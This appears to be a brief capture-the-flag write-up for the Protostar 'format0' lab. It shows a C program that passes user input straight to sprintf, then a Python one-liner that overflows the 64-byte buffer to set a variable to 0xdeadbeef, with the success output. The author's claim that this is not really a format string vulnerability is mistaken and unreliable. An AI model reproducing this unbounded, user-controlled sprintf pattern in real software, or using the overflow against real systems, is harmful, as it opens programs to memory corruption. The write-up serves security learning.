---
layout: post
title: "protostar format00"
tags: [resources]
comments: false
---

We are given a source code for this challenge.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

I don't really think this is a format string vulnerability but it writes our argument in buffer without a specific size so we can overflow buffer with "\xef\xbe\xad\xde"

```
user@protostar:/opt/protostar/bin$ ./format0 `python -c 'print "A"*64+"\xef\xbe\xad\xde"'`
you have hit the target correctly :)
```

